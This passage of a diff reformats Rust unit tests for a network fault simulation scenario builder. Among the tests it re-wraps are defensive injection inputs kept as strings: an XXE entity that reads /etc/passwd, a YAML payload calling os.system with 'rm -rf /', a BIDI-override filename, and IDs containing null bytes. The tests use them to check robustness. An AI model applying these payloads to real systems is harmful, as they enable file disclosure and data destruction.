+                        epoch: 42,
+                        within_ticks: 0,
+                    },
                 ],
             };
-            assert_eq!(extreme_epochs.assertion_count(), 3, "extreme epoch values should count");
+            assert_eq!(
+                extreme_epochs.assertion_count(),
+                3,
+                "extreme epoch values should count"
+            );
 
             // Test: assertion count consistency with vector length
             let consistency_test = Scenario {
@@ -1059,9 +1451,11 @@ impl Scenario {
                 name: "consistency".to_string(),
                 description: "".to_string(),
                 seed: 42,
-                nodes: vec![
-                    VirtualNode { id: "n1".to_string(), name: "Node 1".to_string(), role: NodeRole::Coordinator },
-                ],
+                nodes: vec![VirtualNode {
+                    id: "n1".to_string(),
+                    name: "Node 1".to_string(),
+                    role: NodeRole::Coordinator,
+                }],
                 links: vec![],
                 fault_profiles: BTreeMap::new(),
                 assertions: vec![
@@ -1069,7 +1463,11 @@ impl Scenario {
                     ScenarioAssertion::NoDeadlock { within_ticks: 100 },
                 ],
             };
-            assert_eq!(consistency_test.assertion_count(), consistency_test.assertions.len(), "assertion_count should match assertions.len()");
+            assert_eq!(
+                consistency_test.assertion_count(),
+                consistency_test.assertions.len(),
+                "assertion_count should match assertions.len()"
+            );
 
             // Test: deterministic behavior across multiple calls
             let stable_assertions = Scenario {
@@ -1077,17 +1475,21 @@ impl Scenario {
                 name: "stable".to_string(),
                 description: "".to_string(),
                 seed: 42,
-                nodes: vec![
-                    VirtualNode { id: "n1".to_string(), name: "Node 1".to_string(), role: NodeRole::Coordinator },
-                ],
+                nodes: vec![VirtualNode {
+                    id: "n1".to_string(),
+                    name: "Node 1".to_string(),
+                    role: NodeRole::Coordinator,
+                }],
                 links: vec![],
                 fault_profiles: BTreeMap::new(),
-                assertions: vec![
-                    ScenarioAssertion::AllNodesReachQuiescence,
-                ],
+                assertions: vec![ScenarioAssertion::AllNodesReachQuiescence],
             };
             for _ in 0..5 {
-                assert_eq!(stable_assertions.assertion_count(), 1, "assertion count should be deterministic");
+                assert_eq!(
+                    stable_assertions.assertion_count(),
+                    1,
+                    "assertion count should be deterministic"
+                );
             }
         }
     }
@@ -1106,9 +1508,21 @@ impl Scenario {
                 description: String::new(),
                 seed: 42,
                 nodes: vec![
-                    VirtualNode { id: "normal".to_string(), name: "Normal".to_string(), role: NodeRole::Coordinator },
-                    VirtualNode { id: "".to_string(), name: "Empty ID".to_string(), role: NodeRole::Participant },
-                    VirtualNode { id: " ".to_string(), name: "Space".to_string(), role: NodeRole::Observer },
+                    VirtualNode {
+                        id: "normal".to_string(),
+                        name: "Normal".to_string(),
+                        role: NodeRole::Coordinator,
+                    },
+                    VirtualNode {
+                        id: "".to_string(),
+                        name: "Empty ID".to_string(),
+                        role: NodeRole::Participant,
+                    },
+                    VirtualNode {
+                        id: " ".to_string(),
+                        name: "Space".to_string(),
+                        role: NodeRole::Observer,
+                    },
                 ],
                 links: vec![],
                 fault_profiles: BTreeMap::new(),
@@ -1116,28 +1530,55 @@ impl Scenario {
             };
 
             // Test: empty string node ID
-            assert!(test_scenario.has_node(""), "should find empty string node id");
+            assert!(
+                test_scenario.has_node(""),
+                "should find empty string node id"
+            );
 
             // Test: single space node ID
-            assert!(test_scenario.has_node(" "), "should find single space node id");
+            assert!(
+                test_scenario.has_node(" "),
+                "should find single space node id"
+            );
 
             // Test: case sensitivity
-            assert!(!test_scenario.has_node("NORMAL"), "should be case sensitive");
+            assert!(
+                !test_scenario.has_node("NORMAL"),
+                "should be case sensitive"
+            );
 
             // Test: partial match rejection
-            assert!(!test_scenario.has_node("norm"), "should not match partial strings");
+            assert!(
+                !test_scenario.has_node("norm"),
+                "should not match partial strings"
+            );
 
             // Test: whitespace variations
-            assert!(!test_scenario.has_node(" normal"), "leading whitespace should not match");
-            assert!(!test_scenario.has_node("normal "), "trailing whitespace should not match");
+            assert!(
+                !test_scenario.has_node(" normal"),
+                "leading whitespace should not match"
+            );
+            assert!(
+                !test_scenario.has_node("normal "),
+                "trailing whitespace should not match"
+            );
 
             // Test: unicode edge cases
-            assert!(!test_scenario.has_node("\u{0000}"), "null byte should not match");
-            assert!(!test_scenario.has_node("\t"), "tab character should not match");
+            assert!(
+                !test_scenario.has_node("\u{0000}"),
+                "null byte should not match"
+            );
+            assert!(
+                !test_scenario.has_node("\t"),
+                "tab character should not match"
+            );
 
             // Test: very long non-existent ID
             let long_id = "x".repeat(10000);
-            assert!(!test_scenario.has_node(&long_id), "very long non-existent id should not match");
+            assert!(
+                !test_scenario.has_node(&long_id),
+                "very long non-existent id should not match"
+            );
         }
     }
 
@@ -1164,8 +1605,16 @@ impl Scenario {
                 description: String::new(),
                 seed: 0,
                 nodes: vec![
-                    VirtualNode { id: "n1".to_string(), name: "Node 1".to_string(), role: NodeRole::Coordinator },
-                    VirtualNode { id: "n2".to_string(), name: "Node 2".to_string(), role: NodeRole::Participant },
+                    VirtualNode {
+                        id: "n1".to_string(),
+                        name: "Node 1".to_string(),
+                        role: NodeRole::Coordinator,
+                    },
+                    VirtualNode {
+                        id: "n2".to_string(),
+                        name: "Node 2".to_string(),
+                        role: NodeRole::Participant,
+                    },
                 ],
                 links: vec![],
                 fault_profiles: BTreeMap::new(),
@@ -1180,16 +1629,21 @@ impl Scenario {
                 name: "max-nodes".to_string(),
                 description: String::new(),
                 seed: 42,
-                nodes: (0..MAX_NODES).map(|i| VirtualNode {
-                    id: format!("n{}", i),
-                    name: format!("Node {}", i),
-                    role: NodeRole::Participant,
-                }).collect(),
+                nodes: (0..MAX_NODES)
+                    .map(|i| VirtualNode {
+                        id: format!("n{}", i),
+                        name: format!("Node {}", i),
+                        role: NodeRole::Participant,
+                    })
+                    .collect(),
                 links: vec![],
                 fault_profiles: BTreeMap::new(),
                 assertions: vec![],
             };
-            assert!(max_nodes_scenario.to_json().is_ok(), "MAX_NODES should be valid");
+            assert!(
+                max_nodes_scenario.to_json().is_ok(),
+                "MAX_NODES should be valid"
+            );
 
             // Test: scenario with one too many nodes should fail
             let over_max_nodes = Scenario {
@@ -1197,16 +1651,21 @@ impl Scenario {
                 name: "over-max".to_string(),
                 description: String::new(),
                 seed: 42,
-                nodes: (0..=MAX_NODES).map(|i| VirtualNode {
-                    id: format!("n{}", i),
-                    name: format!("Node {}", i),
-                    role: NodeRole::Participant,
-                }).collect(),
+                nodes: (0..=MAX_NODES)
+                    .map(|i| VirtualNode {
+                        id: format!("n{}", i),
+                        name: format!("Node {}", i),
+                        role: NodeRole::Participant,
+                    })
+                    .collect(),
                 links: vec![],
                 fault_profiles: BTreeMap::new(),
                 assertions: vec![],
             };
-            assert!(over_max_nodes.to_json().is_err(), "over MAX_NODES should fail");
+            assert!(
+                over_max_nodes.to_json().is_err(),
+                "over MAX_NODES should fail"
+            );
         }
     }
 
@@ -1365,7 +1824,10 @@ impl ScenarioBuilder {
             // Test: empty node ID should be allowed but caught at validation
             let mut builder = ScenarioBuilder::new("test");
             let result = builder.add_node("", "Empty ID Node", NodeRole::Coordinator);
-            assert!(result.is_ok(), "empty node id should be allowed at add time");
+            assert!(
+                result.is_ok(),
+                "empty node id should be allowed at add time"
+            );
 
             // Test: whitespace-only node ID edge case
             let mut builder = ScenarioBuilder::new("test");
@@ -1374,9 +1836,14 @@ impl ScenarioBuilder {
 
             // Test: duplicate detection is case-sensitive
             let mut builder = ScenarioBuilder::new("test");
-            let builder = builder.add_node("Node1", "First", NodeRole::Coordinator).unwrap();
+            let builder = builder
+                .add_node("Node1", "First", NodeRole::Coordinator)
+                .unwrap();
             let result = builder.add_node("node1", "Second", NodeRole::Participant);
-            assert!(result.is_ok(), "case sensitivity should allow 'Node1' and 'node1'");
+            assert!(
+                result.is_ok(),
+                "case sensitivity should allow 'Node1' and 'node1'"
+            );
 
             // Test: Unicode node IDs
             let mut builder = ScenarioBuilder::new("test");
@@ -1425,7 +1892,10 @@ impl ScenarioBuilder {
             // Test: empty link ID edge case
             let mut builder = ScenarioBuilder::new("test");
             let result = builder.add_link("", "n1", "n2", false);
-            assert!(result.is_ok(), "empty link id should be allowed at add time");
+            assert!(
+                result.is_ok(),
+                "empty link id should be allowed at add time"
+            );
 
             // Test: source equals target (self-loop) should be allowed
             let mut builder = ScenarioBuilder::new("test");
@@ -1436,19 +1906,27 @@ impl ScenarioBuilder {
             let mut builder = ScenarioBuilder::new("test");
             let builder = builder.add_link("L1", "A", "B", false).unwrap();
             let result = builder.add_link("L2", "B", "A", false);
-            assert!(result.is_ok(), "reversed endpoints should be allowed as different link");
+            assert!(
+                result.is_ok(),
+                "reversed endpoints should be allowed as different link"
+            );
 
             // Test: duplicate link detection with different bidirectional flag
             let mut builder = ScenarioBuilder::new("test");
             let builder = builder.add_link("same-id", "n1", "n2", true).unwrap();
             let result = builder.add_link("same-id", "n1", "n2", false);
-            assert!(result.is_err(), "same id with different bidirectional should fail");
+            assert!(
+                result.is_err(),
+                "same id with different bidirectional should fail"
+            );
 
             // Test: link capacity boundary (at MAX_LINKS)
             let mut builder = ScenarioBuilder::new("test");
             // Fill up to capacity limit
             for i in 0..10 {
-                builder = builder.add_link(format!("link-{}", i), "n1", "n2", false).unwrap();
+                builder = builder
+                    .add_link(format!("link-{}", i), "n1", "n2", false)
+                    .unwrap();
             }
             // Should handle capacity via push_bounded without panicking
             let result = builder.add_link("overflow-link", "n1", "n2", false);
@@ -1501,50 +1979,69 @@ impl ScenarioBuilder {
             // Test: builder with u64::MAX seed (boundary condition)
             let result = ScenarioBuilder::new("max-seed")
                 .seed(u64::MAX)
-                .add_node("n1", "Node 1", NodeRole::Coordinator).unwrap()
-                .add_node("n2", "Node 2", NodeRole::Participant).unwrap()
+                .add_node("n1", "Node 1", NodeRole::Coordinator)
+                .unwrap()
+                .add_node("n2", "Node 2", NodeRole::Participant)
+                .unwrap()
                 .build();
             assert!(result.is_ok(), "u64::MAX seed should be valid");
 
             // Test: builder with seed = 1 (minimum valid seed)
             let result = ScenarioBuilder::new("min-seed")
                 .seed(1)
-                .add_node("n1", "Node 1", NodeRole::Coordinator).unwrap()
-                .add_node("n2", "Node 2", NodeRole::Participant).unwrap()
+                .add_node("n1", "Node 1", NodeRole::Coordinator)
+                .unwrap()
+                .add_node("n2", "Node 2", NodeRole::Participant)
+                .unwrap()
                 .build();
             assert!(result.is_ok(), "seed = 1 should be valid");
 
             // Test: builder with whitespace-only name
             let result = ScenarioBuilder::new("   ")
                 .seed(42)
-                .add_node("n1", "Node 1", NodeRole::Coordinator).unwrap()
-                .add_node("n2", "Node 2", NodeRole::Participant).unwrap()
+                .add_node("n1", "Node 1", NodeRole::Coordinator)
+                .unwrap()
+                .add_node("n2", "Node 2", NodeRole::Participant)
+                .unwrap()
                 .build();
             assert!(result.is_ok(), "whitespace-only name should be allowed");
 
             // Test: empty assertions vector
             let result = ScenarioBuilder::new("no-assertions")
                 .seed(42)
-                .add_node("n1", "Node 1", NodeRole::Coordinator).unwrap()
-                .add_node("n2", "Node 2", NodeRole::Participant).unwrap()
+                .add_node("n1", "Node 1", NodeRole::Coordinator)
+                .unwrap()
+                .add_node("n2", "Node 2", NodeRole::Participant)
+                .unwrap()
                 .build();
             assert!(result.is_ok(), "empty assertions should be valid");
 
             // Test: fault profile for non-existent link
             let result = ScenarioBuilder::new("bad-fault-profile")
                 .seed(42)
-                .add_node("n1", "Node 1", NodeRole::Coordinator).unwrap()
-                .add_node("n2", "Node 2", NodeRole::Participant).unwrap()
-                .set_fault_profile("ghost-link", super::super::virtual_transport::LinkFaultConfig::default())
+                .add_node("n1", "Node 1", NodeRole::Coordinator)
+                .unwrap()
+                .add_node("n2", "Node 2", NodeRole::Participant)
+                .unwrap()
+                .set_fault_profile(
+                    "ghost-link",
+                    super::super::virtual_transport::LinkFaultConfig::default(),
+                )
                 .build();
-            assert!(result.is_err(), "fault profile for non-existent link should fail");
+            assert!(
+                result.is_err(),
+                "fault profile for non-existent link should fail"
+            );
 
             // Test: mixed node roles scenario should be valid
             let result = ScenarioBuilder::new("mixed-roles")
                 .seed(42)
-                .add_node("coord", "Coordinator", NodeRole::Coordinator).unwrap()
-                .add_node("participant", "Participant", NodeRole::Participant).unwrap()
-                .add_node("observer", "Observer", NodeRole::Observer).unwrap()
+                .add_node("coord", "Coordinator", NodeRole::Coordinator)
+                .unwrap()
+                .add_node("participant", "Participant", NodeRole::Participant)
+                .unwrap()
+                .add_node("observer", "Observer", NodeRole::Observer)
+                .unwrap()
                 .build();
             assert!(result.is_ok(), "mixed node roles should be valid");
 
@@ -1554,12 +2051,21 @@ impl ScenarioBuilder {
             let unicode_attack_name = "scenario\u{202E}kcatta\u{202D}.exe"; // BIDI override attack
             let result = ScenarioBuilder::new(unicode_attack_name)
                 .seed(12345)
-                .add_node("n1", "Node 1", NodeRole::Coordinator).unwrap()
-                .add_node("n2", "Node 2", NodeRole::Participant).unwrap()
+                .add_node("n1", "Node 1", NodeRole::Coordinator)
+                .unwrap()
+                .add_node("n2", "Node 2", NodeRole::Participant)
+                .unwrap()
                 .build();
-            assert!(result.is_ok(), "Unicode injection in scenario name should be preserved but not break functionality");
+            assert!(
+                result.is_ok(),
+                "Unicode injection in scenario name should be preserved but not break functionality"
+            );
             if let Ok(scenario) = result {
-                assert_eq!(scenario.name(), unicode_attack_name, "Malicious scenario name should be preserved");
+                assert_eq!(
+                    scenario.name(),
+                    unicode_attack_name,
+                    "Malicious scenario name should be preserved"
+                );
             }
 
             // Test: Arithmetic overflow protection in seed boundaries
@@ -1567,22 +2073,37 @@ impl ScenarioBuilder {
             for &test_seed in &extreme_seeds {
                 let result = ScenarioBuilder::new("seed-boundary-test")
                     .seed(test_seed)
-                    .add_node("n1", "Node 1", NodeRole::Coordinator).unwrap()
-                    .add_node("n2", "Node 2", NodeRole::Participant).unwrap()
+                    .add_node("n1", "Node 1", NodeRole::Coordinator)
+                    .unwrap()
+                    .add_node("n2", "Node 2", NodeRole::Participant)
+                    .unwrap()
                     .build();
-                assert!(result.is_ok(), "Boundary seed value {} should be handled without overflow", test_seed);
+                assert!(
+                    result.is_ok(),
+                    "Boundary seed value {} should be handled without overflow",
+                    test_seed
+                );
             }
 
             // Test: Memory exhaustion through massive node names
             let massive_node_name = "X".repeat(100_000); // 100KB node name
             let result = ScenarioBuilder::new("massive-names")
                 .seed(98765)
-                .add_node("n1", &massive_node_name, NodeRole::Coordinator).unwrap()
-                .add_node("n2", "Normal Node", NodeRole::Participant).unwrap()
+                .add_node("n1", &massive_node_name, NodeRole::Coordinator)
+                .unwrap()
+                .add_node("n2", "Normal Node", NodeRole::Participant)
+                .unwrap()
                 .build();
-            assert!(result.is_ok(), "Massive node names should be handled gracefully");
+            assert!(
+                result.is_ok(),
+                "Massive node names should be handled gracefully"
+            );
             if let Ok(scenario) = result {
-                assert_eq!(scenario.nodes()[0].name.len(), 100_000, "Massive node name should be preserved");
+                assert_eq!(
+                    scenario.nodes()[0].name.len(),
+                    100_000,
+                    "Massive node name should be preserved"
+                );
             }
 
             // Test: Concurrent operation simulation (rapid builder chaining)
@@ -1596,8 +2117,10 @@ impl ScenarioBuilder {
                 let handle = thread::spawn(move || {
                     let result = ScenarioBuilder::new(format!("concurrent-scenario-{}", i))
                         .seed(1000000 + i as u64)
-                        .add_node("coord", "Coordinator", NodeRole::Coordinator).unwrap()
-                        .add_node("part", "Participant", NodeRole::Participant).unwrap()
+                        .add_node("coord", "Coordinator", NodeRole::Coordinator)
+                        .unwrap()
+                        .add_node("part", "Participant", NodeRole::Participant)
+                        .unwrap()
                         .build();
                     results_clone.lock().unwrap().push(result.is_ok());
                 });
@@ -1608,24 +2131,45 @@ impl ScenarioBuilder {
             }
             let results = shared_results.lock().unwrap();
             assert_eq!(results.len(), 5, "All concurrent builds should complete");
-            assert!(results.iter().all(|&success| success), "All concurrent builds should succeed");
+            assert!(
+                results.iter().all(|&success| success),
+                "All concurrent builds should succeed"
+            );
 
             // Test: Node capacity boundary attacks (at MAX_NODES limit)
             let mut massive_builder = ScenarioBuilder::new("capacity-test").seed(777);
             for i in 0..MAX_NODES {
-                massive_builder = massive_builder.add_node(format!("node_{}", i), format!("Node {}", i), NodeRole::Participant).unwrap();
+                massive_builder = massive_builder
+                    .add_node(
+                        format!("node_{}", i),
+                        format!("Node {}", i),
+                        NodeRole::Participant,
+                    )
+                    .unwrap();
             }
             let result = massive_builder.build();
-            assert!(result.is_ok(), "Scenario with MAX_NODES nodes should be valid");
+            assert!(
+                result.is_ok(),
+                "Scenario with MAX_NODES nodes should be valid"
+            );
 
             // Test: Node capacity overflow (exceeding MAX_NODES)
             let mut overflow_builder = ScenarioBuilder::new("overflow-test").seed(888);
             // Add more than MAX_NODES
             for i in 0..(MAX_NODES + 5) {
-                overflow_builder = overflow_builder.add_node(format!("overflow_node_{}", i), format!("Overflow Node {}", i), NodeRole::Observer).unwrap();
+                overflow_builder = overflow_builder
+                    .add_node(
+                        format!("overflow_node_{}", i),
+                        format!("Overflow Node {}", i),
+                        NodeRole::Observer,
+                    )
+                    .unwrap();
             }
             let result = overflow_builder.build();
-            assert!(result.is_err(), "Scenario exceeding MAX_NODES should fail validation");
+            assert!(
+                result.is_err(),
+                "Scenario exceeding MAX_NODES should fail validation"
+            );
             if let Err(ScenarioBuilderError::TooManyNodes { count, max }) = result {
                 assert!(count > max, "Error should indicate too many nodes");
             }
@@ -1633,28 +2177,49 @@ impl ScenarioBuilder {
             // Test: Topology validation with malformed link endpoints
             let malformed_result = ScenarioBuilder::new("malformed-topology")
                 .seed(999)
-                .add_node("existing", "Existing Node", NodeRole::Coordinator).unwrap()
-                .add_node("real", "Real Node", NodeRole::Participant).unwrap()
-                .add_link("ghost-link", "non_existent_source", "non_existent_target", true).unwrap()
+                .add_node("existing", "Existing Node", NodeRole::Coordinator)
+                .unwrap()
+                .add_node("real", "Real Node", NodeRole::Participant)
+                .unwrap()
+                .add_link(
+                    "ghost-link",
+                    "non_existent_source",
+                    "non_existent_target",
+                    true,
+                )
+                .unwrap()
                 .build();
-            assert!(malformed_result.is_err(), "Links to non-existent nodes should fail validation");
+            assert!(
+                malformed_result.is_err(),
+                "Links to non-existent nodes should fail validation"
+            );
 
             // Test: Fault profile injection with malicious link IDs
             let malicious_link_ids = [
                 "link\x00with\x00nulls",
                 "link\"with'quotes",
                 "link\nwith\nlines",
-                "link\u{FEFF}with\u{200B}invisibles"
+                "link\u{FEFF}with\u{200B}invisibles",
             ];
             for &malicious_id in &malicious_link_ids {
                 let result = ScenarioBuilder::new("fault-profile-injection")
                     .seed(555)
-                    .add_node("n1", "Node 1", NodeRole::Coordinator).unwrap()
-                    .add_node("n2", "Node 2", NodeRole::Participant).unwrap()
-                    .add_link(malicious_id, "n1", "n2", false).unwrap()
-                    .set_fault_profile(malicious_id, super::super::virtual_transport::LinkFaultConfig::default())
+                    .add_node("n1", "Node 1", NodeRole::Coordinator)
+                    .unwrap()
+                    .add_node("n2", "Node 2", NodeRole::Participant)
+                    .unwrap()
+                    .add_link(malicious_id, "n1", "n2", false)
+                    .unwrap()
+                    .set_fault_profile(
+                        malicious_id,
+                        super::super::virtual_transport::LinkFaultConfig::default(),
+                    )
                     .build();
-                assert!(result.is_ok(), "Malicious link ID '{}' should be handled safely", malicious_id);
+                assert!(
+                    result.is_ok(),
+                    "Malicious link ID '{}' should be handled safely",
+                    malicious_id
+                );
             }
 
             // Test: Resource exhaustion through massive description strings
@@ -1662,12 +2227,21 @@ impl ScenarioBuilder {
             let result = ScenarioBuilder::new("massive-description")
                 .description(&massive_description)
                 .seed(444)
-                .add_node("n1", "Node 1", NodeRole::Coordinator).unwrap()
-                .add_node("n2", "Node 2", NodeRole::Participant).unwrap()
+                .add_node("n1", "Node 1", NodeRole::Coordinator)
+                .unwrap()
+                .add_node("n2", "Node 2", NodeRole::Participant)
+                .unwrap()
                 .build();
-            assert!(result.is_ok(), "Massive description should be handled without memory issues");
+            assert!(
+                result.is_ok(),
+                "Massive description should be handled without memory issues"
+            );
             if let Ok(scenario) = result {
-                assert_eq!(scenario.description().len(), 1_000_000, "Massive description should be preserved");
+                assert_eq!(
+                    scenario.description().len(),
+                    1_000_000,
+                    "Massive description should be preserved"
+                );
             }
 
             // Test: Serialization format injection resistance in node names and descriptions
@@ -1675,26 +2249,50 @@ impl ScenarioBuilder {
             let xml_injection = r#"<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>"#;
             let yaml_injection = r#"!!python/object/apply:os.system ["rm -rf /"]"#;
 
-            for (name, injection) in [("json", json_injection), ("xml", xml_injection), ("yaml", yaml_injection)] {
+            for (name, injection) in [
+                ("json", json_injection),
+                ("xml", xml_injection),
+                ("yaml", yaml_injection),
+            ] {
                 let result = ScenarioBuilder::new(format!("injection-test-{}", name))
                     .description(injection)
                     .seed(333)
-                    .add_node("malicious", injection, NodeRole::Coordinator).unwrap()
-                    .add_node("normal", "Normal Node", NodeRole::Participant).unwrap()
+                    .add_node("malicious", injection, NodeRole::Coordinator)
+                    .unwrap()
+                    .add_node("normal", "Normal Node", NodeRole::Participant)
+                    .unwrap()
                     .build();
-                assert!(result.is_ok(), "{} injection should be handled safely", name);
+                assert!(
+                    result.is_ok(),
+                    "{} injection should be handled safely",
+                    name
+                );
                 if let Ok(scenario) = result {
-                    assert_eq!(scenario.description(), injection, "{} injection in description should be preserved as text", name);
-                    assert_eq!(scenario.nodes()[0].name, injection, "{} injection in node name should be preserved as text", name);
+                    assert_eq!(
+                        scenario.description(),
+                        injection,
+                        "{} injection in description should be preserved as text",
+                        name
+                    );
+                    assert_eq!(
+                        scenario.nodes()[0].name,
+                        injection,
+                        "{} injection in node name should be preserved as text",
+                        name
+                    );
                 }
             }
 
             // Test: Boundary validation edge cases with minimum node count
             let single_node_result = ScenarioBuilder::new("single-node")
                 .seed(111)
-                .add_node("lonely", "Lonely Node", NodeRole::Coordinator).unwrap()
+                .add_node("lonely", "Lonely Node", NodeRole::Coordinator)
+                .unwrap()
                 .build();
-            assert!(single_node_result.is_err(), "Single node should fail minimum node validation");
+            assert!(
+                single_node_result.is_err(),
+                "Single node should fail minimum node validation"
+            );
             if let Err(ScenarioBuilderError::TooFewNodes { count, min }) = single_node_result {
                 assert_eq!(count, 1, "Count should be 1 for single node");
                 assert_eq!(min, MIN_NODES, "Min should match MIN_NODES constant");
@@ -1705,23 +2303,33 @@ impl ScenarioBuilder {
                 ("node_abc", "node_def"),
                 ("link_xyz", "link_uvw"),
                 ("id_123", "id_456"),
-                ("test_aaa", "test_bbb")
+                ("test_aaa", "test_bbb"),
             ];
             for &(id1, id2) in &collision_candidates {
                 let result = ScenarioBuilder::new("collision-test")
                     .seed(222)
-                    .add_node(id1, "Node 1", NodeRole::Coordinator).unwrap()
-                    .add_node(id2, "Node 2", NodeRole::Participant).unwrap()
-                    .add_link("link1", id1, id2, false).unwrap()
+                    .add_node(id1, "Node 1", NodeRole::Coordinator)
+                    .unwrap()
+                    .add_node(id2, "Node 2", NodeRole::Participant)
+                    .unwrap()
+                    .add_link("link1", id1, id2, false)
+                    .unwrap()
                     .build();
-                assert!(result.is_ok(), "Similar IDs should not collide: {} vs {}", id1, id2);
+                assert!(
+                    result.is_ok(),
+                    "Similar IDs should not collide: {} vs {}",
+                    id1,
+                    id2
+                );
             }
 
             // Test: State consistency validation under zero seed rejection
             let zero_seed_result = ScenarioBuilder::new("zero-seed-test")
                 .seed(0)
-                .add_node("n1", "Node 1", NodeRole::Coordinator).unwrap()
-                .add_node("n2", "Node 2", NodeRole::Participant).unwrap()
+                .add_node("n1", "Node 1", NodeRole::Coordinator)
+                .unwrap()
+                .add_node("n2", "Node 2", NodeRole::Participant)
+                .unwrap()
                 .build();
             assert!(zero_seed_result.is_err(), "Zero seed should be rejected");
             if let Err(ScenarioBuilderError::NoSeed) = zero_seed_result {
@@ -1733,20 +2341,32 @@ impl ScenarioBuilder {
             // Test: Link validation with self-referential topology
             let self_loop_result = ScenarioBuilder::new("self-loop")
                 .seed(777)
-                .add_node("self_node", "Self Node", NodeRole::Coordinator).unwrap()
-                .add_node("other_node", "Other Node", NodeRole::Participant).unwrap()
-                .add_link("self_link", "self_node", "self_node", true).unwrap()
-                .add_link("normal_link", "self_node", "other_node", false).unwrap()
+                .add_node("self_node", "Self Node", NodeRole::Coordinator)
+                .unwrap()
+                .add_node("other_node", "Other Node", NodeRole::Participant)
+                .unwrap()
+                .add_link("self_link", "self_node", "self_node", true)
+                .unwrap()
+                .add_link("normal_link", "self_node", "other_node", false)
+                .unwrap()
                 .build();
-            assert!(self_loop_result.is_ok(), "Self-referential links should be valid");
+            assert!(
+                self_loop_result.is_ok(),
+                "Self-referential links should be valid"
+            );
 
             // Test: Empty scenario name boundary condition
             let empty_name_result = ScenarioBuilder::new("")
                 .seed(666)
-                .add_node("n1", "Node 1", NodeRole::Coordinator).unwrap()
-                .add_node("n2", "Node 2", NodeRole::Participant).unwrap()
+                .add_node("n1", "Node 1", NodeRole::Coordinator)
+                .unwrap()
+                .add_node("n2", "Node 2", NodeRole::Participant)
+                .unwrap()
                 .build();
-            assert!(empty_name_result.is_err(), "Empty scenario name should be rejected");
+            assert!(
+                empty_name_result.is_err(),
+                "Empty scenario name should be rejected"
+            );
             if let Err(ScenarioBuilderError::EmptyName) = empty_name_result {
                 // Expected error
             } else {
@@ -3365,7 +3985,8 @@ mod tests {
 
     #[test]
     fn negative_add_node_with_whitespace_only_id_rejected() {
-        let result = ScenarioBuilder::new("test").add_node("   ", "Whitespace Node", NodeRole::Participant);
+        let result =
+            ScenarioBuilder::new("test").add_node("   ", "Whitespace Node", NodeRole::Participant);
         assert!(result.is_err());
         match result.unwrap_err() {
             ScenarioBuilderError::InvalidNodeId(_) => {}
@@ -3375,7 +3996,8 @@ mod tests {
 
     #[test]
     fn negative_add_node_with_null_bytes_in_id_rejected() {
-        let result = ScenarioBuilder::new("test").add_node("node\x00id", "Null Node", NodeRole::Coordinator);
+        let result =
+            ScenarioBuilder::new("test").add_node("node\x00id", "Null Node", NodeRole::Coordinator);
         assert!(result.is_err());
         match result.unwrap_err() {
             ScenarioBuilderError::InvalidNodeId(_) => {}
@@ -3480,9 +4102,11 @@ mod tests {
     #[test]
     fn negative_node_label_with_extremely_long_string_handled() {
         let long_label = "x".repeat(100_000); // 100KB label
-        let result = ScenarioBuilder::new("long-label-test")
-            .seed(42)
-            .add_node("n1", &long_label, NodeRole::Coordinator);
+        let result = ScenarioBuilder::new("long-label-test").seed(42).add_node(
+            "n1",
+            &long_label,
+            NodeRole::Coordinator,
+        );
 
         if let Ok(mut builder) = result {
             // If accepted, should handle gracefully in build
@@ -3498,7 +4122,7 @@ mod tests {
     #[test]
     fn negative_link_fault_config_with_extreme_values_handled() {
         let extreme_fault_config = LinkFaultConfig {
-            packet_loss_rate: 2.0,  // > 1.0 invalid probability
+            packet_loss_rate: 2.0, // > 1.0 invalid probability
             latency_ms_base: u64::MAX,
             latency_ms_jitter: u64::MAX,
             bandwidth_limit_kbps: None,
@@ -3513,7 +4137,11 @@ mod tests {
         // Should either reject invalid config or clamp to valid ranges
         if result.is_ok() {
             let scenario = builder.build().unwrap();
-            let link = scenario.links.iter().find(|l| l.id == "extreme-link").unwrap();
+            let link = scenario
+                .links
+                .iter()
+                .find(|l| l.id == "extreme-link")
+                .unwrap();
             if let Some(ref config) = link.fault_config {
                 // If accepted, should validate or clamp extreme values
                 assert!(config.packet_loss_rate >= 0.0);
@@ -3532,15 +4160,16 @@ mod tests {
             within_ticks: 0, // Zero ticks - impossible condition
         };
 
-        let result = two_node_builder()
-            .unwrap()
-            .add_assertion(assertion)
-            .build();
+        let result = two_node_builder().unwrap().add_assertion(assertion).build();
 
         if let Ok(scenario) = result {
             // If accepted, verify it's recorded correctly
-            assert!(scenario.assertions.iter().any(|a| matches!(a,
-                ScenarioAssertion::MessageDelivered { within_ticks: 0, .. }
+            assert!(scenario.assertions.iter().any(|a| matches!(
+                a,
+                ScenarioAssertion::MessageDelivered {
+                    within_ticks: 0,
+                    ..
+                }
             )));
         }
         // Rejection would also be reasonable for impossible conditions
@@ -3549,7 +4178,9 @@ mod tests {
     #[test]
     fn negative_add_duplicate_node_id_rejected() {
         let mut builder = ScenarioBuilder::new("dup-nodes").seed(42);
-        let _ = builder.add_node("duplicate", "First Node", NodeRole::Coordinator).unwrap();
+        let _ = builder
+            .add_node("duplicate", "First Node", NodeRole::Coordinator)
+            .unwrap();
 
         let result = builder.add_node("duplicate", "Second Node", NodeRole::Participant);
         assert!(result.is_err());
@@ -3564,8 +4195,10 @@ mod tests {
         let result = ScenarioBuilder::new("isolated")
             .seed(42)
             .description("Isolated nodes scenario")
-            .add_node("isolated1", "Isolated One", NodeRole::Coordinator).unwrap()
-            .add_node("isolated2", "Isolated Two", NodeRole::Participant).unwrap()
+            .add_node("isolated1", "Isolated One", NodeRole::Coordinator)
+            .unwrap()
+            .add_node("isolated2", "Isolated Two", NodeRole::Participant)
+            .unwrap()
             // No links between nodes - they're isolated
             .build();
 
@@ -3592,7 +4225,9 @@ mod tests {
 
         // Add exactly MAX_NODES - should succeed
         for i in 0..MAX_NODES {
-            builder = builder.add_node(format!("n{i}"), format!("Node {i}"), NodeRole::Participant).unwrap();
+            builder = builder
+                .add_node(format!("n{i}"), format!("Node {i}"), NodeRole::Participant)
+                .unwrap();
         }
 
         // Try to add one more - should fail
@@ -3624,8 +4259,10 @@ mod tests {
         let result = ScenarioBuilder::new("max-seed")
             .seed(u64::MAX)
             .description("Maximum seed value")
-            .add_node("n1", "Node One", NodeRole::Coordinator).unwrap()
-            .add_node("n2", "Node Two", NodeRole::Participant).unwrap()
+            .add_node("n1", "Node One", NodeRole::Coordinator)
+            .unwrap()
+            .add_node("n2", "Node Two", NodeRole::Participant)
+            .unwrap()
             .build();
 
